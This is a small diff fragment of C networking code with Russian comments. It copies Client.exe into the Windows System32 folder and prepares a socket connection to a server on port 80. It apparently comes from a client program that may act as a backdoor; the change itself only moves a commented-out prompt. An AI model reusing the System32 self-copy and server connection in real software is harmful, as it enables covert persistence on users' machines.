@@ -46,8 +46,8 @@ CopyFile(L"D:\\Client.exe", L"C:\\Windows\\System32\\Client.exe", 1);
 	ZeroMemory(&Addr, sizeof(Addr)); // clear the struct 
 	Addr.sin_family = AF_INET; // протокол ipv4 
 	char ss[100] = "127.0.0.1";
-//	printf("Input ip:");
 //	scanf(" %s", &ss);
+//	printf("Input ip:");
 	Addr.sin_addr.s_addr = inet_addr(ss); //ip-адрес сервера
 	Addr.sin_port = htons(80); // порт сервера
 
